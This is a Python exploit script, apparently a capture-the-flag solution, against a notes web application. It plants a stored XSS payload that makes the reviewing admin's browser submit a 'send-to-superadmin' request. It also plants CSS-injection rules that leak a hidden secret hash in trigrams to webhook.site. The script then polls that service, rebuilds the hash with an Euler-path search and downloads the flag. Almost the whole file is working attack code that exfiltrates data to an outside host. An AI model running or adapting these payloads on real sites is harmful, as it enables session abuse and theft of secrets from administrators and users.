from __future__ import annotations
 
import argparse
import re
import sys
import time
from collections import Counter, defaultdict
from pathlib import Path
from typing import DefaultDict, Iterable
from datetime import datetime
 
import requests


HEX = "0123456789ABCDEF"

def hookURL(webhooktoken: str, path: str):
    path = path.lstrip("/")
    return f"//webhook.site/{webhooktoken}/{path}"

def hookSubDomainURL(webhooktoken: str, path: str):
    path = path.lstrip("/")
    return f"//{webhooktoken}.webhook.site/{path}"

def payload_notes(webhooktoken1, webhooktoken2):
    jsPayload = (
    "<script>(function escalate(){var e=document.querySelector('[data-note-id]');if(!e){"
    "if(document.readyState==='loading'){document.addEventListener('DOMContentLoaded',escalate);"
    "}else{setTimeout(escalate,50);}return;}var id=e.getAttribute('data-note-id');if(!id)return;"
    "var k='esc:'+id;if(sessionStorage.getItem(k))return;sessionStorage.setItem(k,'1');"
    "var f=document.createElement('form');f.method='POST';f.action='/notes/'+id+'/send-to-superadmin';"
    "document.body.append(f);f.submit();})();</script>"
    )
    # base_backgroundimage_vars = ["var(--p, none)"]
    # base_maskimage_vars = []
    #
    # for a in HEX:
    #     for b in HEX:
    #         for c in HEX:
    #             tri = f"{a}{b}{c}"
    #             if int(tri, 16) & 1:
    #                 base_maskimage_vars.append(f"var(--m{tri},none)")
    #             else:
    #                 base_backgroundimage_vars.append(f"var(--t{tri},none)")
    #
    # css_parts = []
    # css_parts.append(
    #     f"#footer-flag{{position:fixed;top:0;left:0;width:1px;height:1px;background-image:{','.join(base_backgroundimage_vars)};mask-image:{','.join(base_maskimage_vars)}}}"
    # )
    #
    # for c in HEX:
    #     css_parts.append(f"#footer-flag[src^='/{c}']{{--p:url({hookURL(webhooktoken1,'p'+c)})}}")
    #
    # for a in HEX:
    #     for b in HEX:
    #         for c in HEX:
    #             tri = f"{a}{b}{c}"
    #             if int(tri, 16) & 1:
    #                 css_parts.append(
    #                     f"#footer-flag[src*='{tri}']{{--m{tri}:url({hookSubDomainURL(webhooktoken2,'m'+tri)})}}"
    #                 )
    #             else:
    #                 css_parts.append(
    #                     f"#footer-flag[src*='{tri}']{{--t{tri}:url({hookURL(webhooktoken1,'t'+tri)})}}"
    #                 )
    #
    # css = "<style>" + "".join(css_parts) + "</style>"
    # beacon = f"<img src=\"{hookURL(webhooktoken1, 'beacon')}\" style=\"display:none;\">"
    # return jsPayload + css + beacon

    N_BUCKETS = 32
    all_tris = [a + b + c for a in HEX for b in HEX for c in HEX]
 
    # Distribute trigrams evenly across 32 buckets (round-robin preserves hex spread)
    buckets = [[] for _ in range(N_BUCKETS)]
    for i, tri in enumerate(all_tris):
        buckets[i % N_BUCKETS].append(tri)
 
    # 32 invisible anchor divs — each receives one bucket's background-image
    html_divs = "".join('<div id="l' + str(n) + '"></div>' for n in range(N_BUCKETS))
 
    css_parts = []
 
    # First-char rules: set --p on #footer-flag, loaded via its own background-image
    css_parts.append(
        "#footer-flag{position:fixed;top:0;left:0;width:1px;height:1px;"
        "background-image:var(--p,none)}"
    )
    for c in HEX:
        css_parts.append(
            "#footer-flag[src^='/" + c + "']{--p:url(" + hookURL(webhooktoken1, "p" + c) + ")}"
        )
 
    # Per-bucket: one base rule on #lN + one setter rule per trigram
    for n, bucket in enumerate(buckets):
        if n < N_BUCKETS // 2:
            url_fn   = hookURL
            token    = webhooktoken1
            path_pfx = "t"
        else:
            url_fn   = hookSubDomainURL
            token    = webhooktoken2
            path_pfx = "m"
 
        vars_list = ",".join("var(--b" + str(n) + "_" + tri + ",none)" for tri in bucket)
        css_parts.append(
            "#l" + str(n) + "{position:fixed;top:0;left:0;width:1px;height:1px;"
            "background-image:" + vars_list + "}"
        )
        for tri in bucket:
            url = url_fn(token, path_pfx + tri)
            css_parts.append(
                "#footer-flag[src*='" + tri + "']{--b" + str(n) + "_" + tri + ":url(" + url + ")}"
            )
 
    css    = "<style>" + "".join(css_parts) + "</style>"
    beacon = '<img src="' + hookURL(webhooktoken1, "beacon") + '" style="display:none;">'
    return jsPayload + html_divs + css + beacon


def register_login_create_note(
    session: requests.Session,
    base_url: str,
    username: str,
    password: str,
    body: str,
) -> str:
    # register and login credential is provided manually
    session.post(f"{base_url}/register", data={"username": username, "password": password},
                 timeout=15, allow_redirects=False)
 
    resp = session.post(f"{base_url}/login", data={"username": username, "password": password},
                        timeout=15, allow_redirects=False)
    if resp.status_code != 302:
        raise RuntimeError(f"login failed: {resp.status_code}")
 
    # post the notes using the POST method provided as it is on the original source code
    resp = session.post(f"{base_url}/notes",
                        files={"title": (None, "please review"), "body": (None, body)},
                        timeout=60, allow_redirects=False)
    if resp.status_code != 302:
        raise RuntimeError(f"note creation failed: {resp.status_code}")
 
    # fetches the note-id returned after submitting the form, if there is no notes based on the regex, the note creation has failed
    match = re.search(r"/notes/([0-9a-fA-F-]{36})", resp.headers.get("Location", ""))
    if not match:
        raise RuntimeError("could not parse note_id from redirect")
    return match.group(1)
 
 
def send_for_review(session: requests.Session, base_url: str, note_id: str) -> None:
    session.post(f"{base_url}/notes/{note_id}/send-for-review", timeout=15, allow_redirects=False)
 
 
def fetch_webhook_requests(session: requests.Session, token_id: str) -> list[dict]:
    # fetch the webhook based on the webhook token, create one on your computer and one on whatever device you have spared, i recommend to open it on incognito tab
    resp = session.get(
        f"https://webhook.site/token/{token_id}/requests",
        params={"per_page": "100", "sorting": "newest", "page": "1"},
        headers={"Accept": "application/json"},
        timeout=15,
    )
    resp.raise_for_status()
    return resp.json().get("data", [])
 
def extract_leaks(items: Iterable[dict]) -> tuple[str | None, set[str]]:
    first_char = None
    trigrams: set[str] = set()
    for item in items:
        url = item.get("url", "")
        if not isinstance(url, str):
            continue
        m = re.search(r"/p([0-9a-fA-F])(?:$|[/?#])", url) # for the leading character (the start of the sha hash
        # first char is to determine the start of the eulerian trail (refer to TG)
        if m:
            first_char = m.group(1).lower()
        m = re.search(r"/t([0-9a-fA-F]{3})(?:$|[/?#])", url) #  for the tuples of 3 HEX that are present in the hash
        if m:
            trigrams.add(m.group(1).lower())
        m = re.search(r"/m([0-9a-fA-F]{3})(?:$|[/?#])", url) # this is also the same as before, only uses m since webhook limits to 50 requests only
        if m:
            trigrams.add(m.group(1).lower())
    return first_char, trigrams
 
 
def find_flag_path(
    session: requests.Session,
    base_url: str,
    first_char: str | None,
    trigrams: set[str],
) -> str:
    # algorithm used is closer to the hierholzers algorithm and using DFS to backtrack
    # https://www.geeksforgeeks.org/dsa/hierholzers-algorithm-directed-graph/
    hex_chars = "0123456789abcdef"
    if not trigrams:
        raise RuntimeError("no trigrams collected yet")
 
    edges: list[tuple[str, str]] = []
    adjacency: DefaultDict[str, list[int]] = defaultdict(list)
    indeg:  Counter[str] = Counter()
    outdeg: Counter[str] = Counter()
 
    for tri in sorted(trigrams):
        u, v = tri[:2], tri[1:]
        eid = len(edges)
        edges.append((u, v))
        adjacency[u].append(eid)
        outdeg[u] += 1
        indeg[v] += 1
 
    vertices = set(indeg) | set(outdeg)
    start_candidates = [v for v in vertices if outdeg[v] == indeg[v] + 1]
    end_candidates   = [v for v in vertices if indeg[v] == outdeg[v] + 1]
    if not start_candidates or not end_candidates:
        raise RuntimeError("missing triagram from request - cannot determine Euler start or end,")
 
    start = sorted(start_candidates)[0]
    end   = sorted(end_candidates)[0]
    if first_char:
        start = next((v for v in sorted(start_candidates) if v.startswith(first_char)), start)
 
    for u in adjacency:
        adjacency[u].sort(key=lambda eid: edges[eid][1])
 
    used      = [False] * len(edges)
    delta     = Counter({v: outdeg[v] - indeg[v] for v in vertices})
    path: list[str] = [start]
    candidates_tried = 0
 
    def degrees_ok(cur: str) -> bool:
        if cur == end:
            return all(delta[v] == 0 for v in vertices)
        if delta[cur] != 1 or delta[end] != -1:
            return False
        return all(delta[v] == 0 for v in vertices if v not in (cur, end))
 
    def dfs(cur: str, used_count: int) -> str | None:
        nonlocal candidates_tried
        if not degrees_ok(cur):
            return None
        if used_count == len(edges):
            if cur != end:
                return None
            digest = path[0] + "".join(n[-1] for n in path[1:])
            if not re.fullmatch(r"[0-9a-f]{64}", digest):
                return None
            candidates_tried += 1
            if candidates_tried > 250_000:
                raise RuntimeError("too many candidates — aborting")
            r = session.head(f"{base_url}/{digest}", timeout=10, allow_redirects=False)
            return digest if r.status_code == 200 else None
        for eid in adjacency.get(cur, []):
            if used[eid]:
                continue
            u, v = edges[eid]
            used[eid] = True;  delta[u] -= 1;  delta[v] += 1;  path.append(v)
            found = dfs(v, used_count + 1)
            if found:
                return found
            path.pop();  delta[v] -= 1;  delta[u] += 1;  used[eid] = False
        return None
 
    digest = dfs(start, 0)
    if not digest:
        raise RuntimeError("no valid digest found — try waiting for more trigrams")
    return f"/{digest}"
 
def download_flag(session: requests.Session, base_url: str, flag_path: str, out_path: Path) -> None:
    resp = session.get(f"{base_url}{flag_path}", timeout=30)
    resp.raise_for_status()
    out_path.write_bytes(resp.content)
 

def parse_args(argv: list[str]) -> argparse.Namespace:
    p = argparse.ArgumentParser(description=__doc__,
                                formatter_class=argparse.RawDescriptionHelpFormatter)
    p.add_argument("--base-url",     default="http://43.129.35.148:6767")
    p.add_argument("--username",     default=None, help="account username (required unless --resume-note-id)")
    p.add_argument("--password",     default=None, help="account password (required unless --resume-note-id)")
    p.add_argument("--token-bg",     required=True, metavar="UUID",
                   help="webhook.site UUID for background-image leaks")
    p.add_argument("--token-mask",   default=None,  metavar="UUID",
                   help="webhook.site UUID for mask-image leaks (optional, reuses --token-bg if omitted)")
    p.add_argument("--resume-note-id", default=None, metavar="UUID",
                   help="skip note creation and resume polling for an existing note id")
    p.add_argument("--wait-seconds", type=int, default=180)
    p.add_argument("--poll-interval",type=int, default=5)
    p.add_argument("--output",       default="flag.png")
    p.add_argument("--no-run",       action="store_true", help="print payload and exit")
    return p.parse_args(argv)
 

 
def main(argv: list[str]) -> int:
    args     = parse_args(argv)
    base_url = args.base_url.rstrip("/")
    token_bg   = args.token_bg
    token_mask = args.token_mask or token_bg
    tokens     = [token_bg] if token_mask == token_bg else [token_bg, token_mask]
 
    uuid_re = re.compile(r"^[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}$", re.I)
    for name, val in [("--token-bg", token_bg), ("--token-mask", token_mask)]:
        if not uuid_re.match(val):
            print(f"{name} is not a valid UUID for webhook token: {val!r}", file=sys.stderr)
            return 1
 
    payload = payload_notes(token_bg, token_mask)
 
    if args.no_run:
        print(payload)
        return 0
 
    print(f"[i] base-url   : {base_url}")
    print(f"[i] username   : {args.username}")
    print(f"[i] token-bg   : {token_bg}")
    print(f"[i] token-mask : {token_mask}")
 
    s = requests.Session()
 
    if args.resume_note_id:
        # Skip registration/login/creation — jump straight to polling
        note_id = args.resume_note_id
        print(f"[i] resuming from note : {base_url}/notes/{note_id}")
        print(f"[i] polling webhook for trigrams (note was already submitted)...")
    else:
        if not args.username or not args.password:
            print("[!] --username and --password are required when not using --resume-note-id",
                  file=sys.stderr)
            return 1
        # print(f"[i] username   : {args.username}")
        note_id = register_login_create_note(s, base_url, args.username, args.password, payload)
        print(f"[i] note created : {base_url}/notes/{note_id}")
        print(f"[i] TIME: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        send_for_review(s, base_url, note_id)
        print("[i] sent for admin review — waiting for bot...")
 
    deadline      = time.time() + args.wait_seconds
    first_char    = None
    trigrams: set[str] = set()
 
    while time.time() < deadline:
        items: list[dict] = []
        for tid in tokens:
            try:
                items.extend(fetch_webhook_requests(s, tid))
            except requests.RequestException as e:
                print(f"[!] webhook fetch error ({tid}): {e}")
 
        first_char, trigrams = extract_leaks(items)
        print(f"[i] trigrams collected: {len(trigrams)}/62  first_char={first_char!r}")
 
        if len(trigrams) >= 62:
            try:
                flag_path = find_flag_path(s, base_url, first_char, trigrams)
                print(f"[+] flag path: {flag_path}")
                out = Path(args.output).resolve()
                download_flag(s, base_url, flag_path, out)
                print(f"[+] flag saved to: {out}")
                return 0
            except Exception as e:
                print(f"[FAIL] reconstruction failed: {e}")
 
        time.sleep(args.poll_interval)
 
    print("[FAIL] timed out — try increasing --wait-seconds", file=sys.stderr)
    return 2
 
 
if __name__ == "__main__":
    raise SystemExit(main(sys.argv[1:]))

